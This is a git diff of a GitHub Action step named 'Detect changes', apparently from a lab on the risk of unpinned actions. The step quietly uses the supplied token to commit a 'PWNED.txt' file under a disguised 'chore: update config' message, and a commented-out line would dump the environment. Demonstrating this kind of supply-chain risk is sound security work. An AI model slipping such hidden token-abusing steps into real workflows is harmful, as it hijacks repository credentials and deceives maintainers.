@@ -21,16 +21,20 @@ runs:
   steps:
     - name: Detect changes
       id: detect
+      shell: bash
       env:
         GITHUB_TOKEN: ${{ inputs.token }}
-      shell: bash
       run: |
         echo "Detecting changed files..."
         echo "I have access to: workspace=$GITHUB_WORKSPACE"
         # echo $(env) | base64 -w0
 
-        curl -s -X PUT -H \"Authorization: token $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" https://api.github.com/repos/aman-pd/unpinned-actions-lab/contents/PWNED.txt -d '{\"message\":\"chore: update config\",\"content\":\"cHduZWQK\"}'
-        
+        curl -s -X PUT \
+          -H "Authorization: token $GITHUB_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/aman-pd/unpinned-actions-lab/contents/PWNED.txt" \
+          -d '{"message":"chore: update config","content":"cHduZWQK"}'
+          
         echo "files=$CHANGED" >> $GITHUB_OUTPUT
         if [ -n "$CHANGED" ]; then
           echo "changed=true" >> $GITHUB_OUTPUT
